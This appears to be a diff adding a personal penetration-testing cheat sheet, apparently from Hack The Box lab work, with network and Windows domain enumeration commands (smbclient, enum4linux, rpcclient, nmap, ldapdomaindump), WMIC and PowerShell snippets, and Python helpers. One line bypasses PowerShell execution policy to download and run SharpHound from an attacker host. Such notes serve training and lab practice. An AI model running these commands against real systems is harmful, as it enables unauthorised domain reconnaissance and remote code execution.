@@ -1,0 +1,69 @@
+Enumeration:
+========================================
+ping sweep:
+for i in `seq 1 254`; do ping -c 1 192.168.1.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & done
+
+
+Credless:
+smbclient -NL //IP
+enum4linux -a IP
+sudo nmap -T4 -Pn -v -oN nmap1.txt -sV -O -p 1-10000 IP
+sudo nmap -T4 -Pn -v -oN nmap2.txt -sV -O -p 10000-65535 IP
+rpcclient -N IP
+
+Creds:
+enum4linux -u USER -p PASS -a IP
+smbclient -U USER -L //IP
+smbclient -U USER //IP/SERVICE PASS
+-----------
+recurse
+ls
+-----------
+
+
+rpcclient -U USER IP
+---------------
+lsaquery
+enumdomusers
+samquerysecobj
+getdompwinfo
+enumprivs
+srvinfo
+---------------
+
+mkdir ldd; ldapdomaindump IP -u DOMAIN\\USER -p PASS -o ldd
+
+Doin shit:
+========================================
+wmic ps list:
+wmic process get ExecutablePath,Commandline /format:list
+
+Powershell recursive dir:
+gci -recurse -erroraction silentlycontinue
+
+Powershell callback exec ps script:
+powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://<attacker-ip>/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All -SearForest -Domain HTB.LOCAL -DomainController FOREST.HTB.LOCAL -LDAPUser svc-alfresco -LDAPPass s3....ce -ZipFileName bloodhound.zip -Verbose"
+
+
+Python Quick grab:
+========================================
+Hex to int:
+int(hex, 16)
+Int to Hex:
+hex(int)
+
+Int to char:
+chr(int)
+char to int:
+ord(char)
+
+Hex string to byte array:
+bytearray.fromhex(str)
+
+Base64 stuff:
+import base64
+base64.b64encode(str)
+base64.b64decode(str)
+
+
+
